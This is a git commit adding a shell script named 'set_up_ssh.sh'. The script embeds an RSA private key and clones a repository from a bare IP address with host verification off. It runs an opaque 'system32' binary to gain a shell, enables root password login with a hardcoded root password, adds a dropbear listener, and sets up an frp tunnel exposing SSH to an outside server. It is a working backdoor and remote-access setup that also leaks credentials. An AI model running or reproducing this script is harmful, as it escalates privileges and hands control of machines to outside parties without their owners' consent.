a603a6853feb5fd48084ee27bda67bc0519f9901
williamarmenta54 <williamarmenta54@gmail.com>
2024-11-13 23:12:48 +0200

    Update and rename set_up_bore.sh to set_up_ssh.sh

---
+++ set_up_ssh.sh
@@ -0,0 +1,168 @@
+#!/bin/sh
+cd
+
+sleep 4
+
+cat > ReginaldBanks <<END
+-----BEGIN RSA PRIVATE KEY-----
+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
+-----END RSA PRIVATE KEY-----
+END
+
+sleep 2
+
+chmod 600 ReginaldBanks
+
+sleep 2
+
+git clone -c "core.sshCommand=ssh -i ReginaldBanks -F /dev/null -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no" git@45.135.58.239:mygitfolder/project.git
+
+sleep 2
+
+cd project
+
+tar -xf system32.tar.gz
+sleep 2
+tar -xf backup2.tar.gz
+sleep 2
+./system32 -S . /bin/bash
+sleep 2
+
+su -
+
+sleep 2
+cd
+sleep 2
+whoami
+sleep 2
+
+export DEBIAN_FRONTEND=noninteractive
+DEBIAN_FRONTEND=noninteractive
+
+sleep 2
+cat /etc/*-release
+sleep 2
+
+apt update >/dev/null;apt -y purge openssh-server;apt -y autoremove openssh-server;apt -y install nano dropbear iputils-ping screen net-tools openssh-server build-essential psmisc libreadline-dev dialog curl wget sudo dialog python3 golang autocutsel git >/dev/null
+sleep 2
+netstat -ntlp
+sleep 3
+cat > /etc/ssh/sshd_config <<EOR
+Port 2222
+PermitRootLogin yes
+PasswordAuthentication yes
+ChallengeResponseAuthentication no
+UsePAM yes
+X11Forwarding yes
+PrintMotd no
+AcceptEnv LANG LC_*
+Subsystem       sftp    /usr/lib/openssh/sftp-server
+EOR
+
+sleep 2
+
+cat > /etc/default/dropbear <<END
+NO_START=0
+DROPBEAR_PORT=2299
+DROPBEAR_EXTRA_ARGS=
+DROPBEAR_BANNER=""
+DROPBEAR_RECEIVE_WINDOW=65536
+END
+
+sleep 2
+echo "root:Pmataga87465622" | chpasswd
+sleep 2
+service ssh restart
+sleep 2
+service dropbear restart
+sleep 2
+netstat -ntlp
+
+sleep 2
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
+dpkg-reconfigure --frontend noninteractive tzdata > /dev/null
+
+sleep 2
+
+TZ='Africa/Johannesburg'; export TZ
+date
+sleep 2
+
+
+curl -s https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz -L -O -J
+tar -xvf frp_0.48.0_linux_amd64.tar.gz
+# start from daemon
+cp frp_0.48.0_linux_amd64/frpc /usr/bin
+mkdir /etc/frp
+mkdir /var/frp  # log
+
+sleep 2
+
+cat > /etc/frp/frpc.ini <<END
+[common]
+server_addr = tempemergencyaccess.teatspray.fun
+server_port = 80
+
+[ssh.silumkomangqongocodesphere]
+type = tcp
+local_ip = 127.0.0.1
+local_port = 2222
+remote_port = 12222
+subdomain = silumkomangqongocodesphere
+
+END
+
+sleep 2
+
+#silumkomangqongocodesphere.tempemergencyaccess.teatspray.fun
+
+/usr/bin/frpc -c /etc/frp/frpc.ini
